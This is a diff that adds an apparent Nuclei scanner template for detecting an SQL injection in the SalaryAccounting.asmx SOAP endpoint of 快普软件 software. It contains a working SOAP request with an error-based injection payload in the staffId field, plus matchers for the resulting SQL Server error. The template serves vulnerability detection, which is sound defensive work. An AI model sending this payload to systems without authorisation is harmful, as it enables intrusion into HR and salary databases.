@@ -1,0 +1,58 @@
+id: kuaipu-salaryaccounting-sqli
+info:
+  name: 快普软件 SalaryAccounting.asmx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerabilities in the SalaryAccounting.asmx service of 快普软件 via SOAP requests.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: http://tempuri.org/Calculate
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <tem:Calculate>
+        <!--type: string-->
+        <tem:SalaryCategory></tem:SalaryCategory>
+        <!--type: string-->
+        <tem:StaffBirthDay></tem:StaffBirthDay>
+        <!--type: string-->
+        <tem:staffId>
+        1) and 1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+</tem:staffId>
+        <!--type: string-->
+        <tem:Department></tem:Department>
+        <!--type: string-->
+        <tem:SubOrg></tem:SubOrg>
+        <!--type: string-->
+        <tem:taxMonthly></tem:taxMonthly>
+        </tem:Calculate>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        part: body
+        words:
+          - "在将 nvarchar 值"
+          - "{{t2}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
